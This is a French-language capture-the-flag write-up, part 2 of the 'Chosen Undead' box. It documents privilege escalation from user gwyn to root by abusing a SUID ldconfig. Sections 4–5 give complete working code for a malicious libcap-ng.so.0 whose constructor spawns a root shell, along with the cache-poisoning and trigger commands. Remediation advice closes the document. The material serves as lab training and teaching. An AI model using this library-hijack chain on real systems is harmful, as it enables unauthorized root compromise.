---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Suite dédiée à l'élévation de privilèges et harmonisation du write-up
cve: CVE-2026-43284, piste Linux testée mais non exploitée ; aucun CVE pour la mauvaise configuration ldconfig SUID
---

# Chosen Undead — Partie 2 : élévation de privilèges

> Cette partie commence après la récupération de `user.txt` avec l'utilisateur `gwyn`.
> La reconnaissance, le reverse engineering, la collision SHA-1, la clé RSA et l'accès SSH sont documentés dans [Chosen_Undead.md](Chosen_Undead.md).

## 1. Contexte et objectif

- **Cible** : même box que la partie 1, avec une adresse IP dynamique.
- **Compte initial** : `gwyn`.
- **Objectif** : obtenir `root` et lire `/root/root.txt`.

Vérification du point de départ :

```bash
whoami
id
```

Résultat attendu :

```text
gwyn
uid=1000(gwyn) gid=1000(gwyn) groups=1000(gwyn)
```

## 2. Énumération des privilèges

On commence par vérifier les droits `sudo` et les exécutables SUID :

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

`sudo -l` demande le mot de passe de `gwyn` et ne fournit pas de chemin exploitable. L'énumération SUID révèle toutefois un binaire inhabituel :

```text
-rwsr-sr-x 1 root root ... /usr/sbin/ldconfig
```

Un `ldconfig` SUID permet de générer un cache de bibliothèques avec les privilèges effectifs de `root` à partir d'une configuration contrôlée par l'utilisateur.

## 3. Vérification de `ldconfig`

On vérifie que la configuration et le cache peuvent être placés dans `/tmp` :

```bash
printf '/tmp\n' > /tmp/test-ld.conf
/usr/sbin/ldconfig -f /tmp/test-ld.conf -C /tmp/test-ld.cache
ls -l /tmp/test-ld.cache
```

Résultat :

```text
-rw-r--r-- 1 root root ... /tmp/test-ld.cache
```

Le fichier créé par `gwyn` appartient à `root`. Le SUID est donc bien actif et la piste est exploitable.

## 4. Préparation de la bibliothèque contrôlée

`su` charge notamment `libcap-ng.so.0` :

```bash
ldd /usr/bin/su | grep cap-ng
```

On prépare une bibliothèque portant le même nom dans un répertoire contrôlé :

```bash
mkdir -p /tmp/evil
cd /tmp/evil
cat > evil.c <<'EOF'
#include <unistd.h>

typedef int capng_type_t;

int capng_have_capability(capng_type_t which, unsigned int capability)
{
    return 0;
}

void *capng_save_state(void)
{
    return 0;
}

void capng_restore_state(void **state)
{
    (void)state;
}

__attribute__((constructor))
void init(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", "-p", NULL);
}
EOF

gcc -fPIC -shared \
  -Wl,-soname,libcap-ng.so.0 \
  -o libcap-ng.so.0 evil.c
```

Le constructeur est exécuté au chargement de la bibliothèque et lance un shell avec conservation des privilèges effectifs.

## 5. Empoisonnement du cache et exécution

On demande à `ldconfig` SUID d'utiliser `/tmp/evil` :

```bash
printf '/tmp/evil\n' > /tmp/evil.conf
/usr/sbin/ldconfig -f /tmp/evil.conf
/usr/sbin/ldconfig -p | grep 'libcap-ng.so.0'
```

Le cache référence alors la bibliothèque contrôlée :

```text
/tmp/evil/libcap-ng.so.0
```

On déclenche son chargement avec un programme qui dépend de `libcap-ng.so.0` :

```bash
su --help
```

Le constructeur lance le shell privilégié. On vérifie le résultat :

```bash
id
whoami
cat /root/root.txt
```

Résultat de la vérification des privilèges :

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

Le contenu de `/root/root.txt` constitue le flag root.

## 6. Chaîne d'exploitation

```text
gwyn
  |
  | /usr/sbin/ldconfig SUID
  v
Cache de bibliothèques contrôlé
  |
  | libcap-ng.so.0 dans /tmp/evil
  v
/usr/bin/su
  |
  | constructeur de la bibliothèque
  v
/bin/sh -p
  |
  v
root
```

## 7. Pistes écartées et CVE

Les pistes Docker, `sudo`, capabilities, cron, `LD_PRELOAD`, `/etc/ld.so.preload` et le binaire SUID `battle` ont été vérifiées sans résultat exploitable.

La référence `CVE-2026-43284` concerne une vulnérabilité Linux dans le traitement XFRM/ESP. Elle a été testée comme piste de privesc dans la box, mais les conditions nécessaires n'ont pas été réunies. Elle n'est donc pas le vecteur retenu pour ce write-up ; l'exploitation finale repose sur la mauvaise configuration de `ldconfig` SUID.

## 8. Remédiation

- Retirer le bit SUID de `ldconfig` et de tout binaire qui n'en a pas besoin : `chmod u-s /usr/sbin/ldconfig`.
- Ne jamais donner à un utilisateur non privilégié le contrôle d'un cache ou d'une configuration de bibliothèques chargées par des programmes SUID.
- Vérifier régulièrement les fichiers SUID avec `find / -perm /6000 -type f`.
- Utiliser des chemins de bibliothèques contrôlés, des permissions strictes et le principe du moindre privilège.
- Ne pas conserver de bibliothèques ou de payloads dans des répertoires accessibles en écriture par un utilisateur non privilégié.

## 9. Reproductibilité

Le parcours commence avec l'accès `gwyn` obtenu dans [Chosen_Undead.md](Chosen_Undead.md). Les commandes, le code de la bibliothèque, les résultats de `ldconfig`, la vérification `id` et la lecture du flag sont présents dans cette partie. Un tiers peut donc rejouer uniquement la suite de privesc sur une box identique.
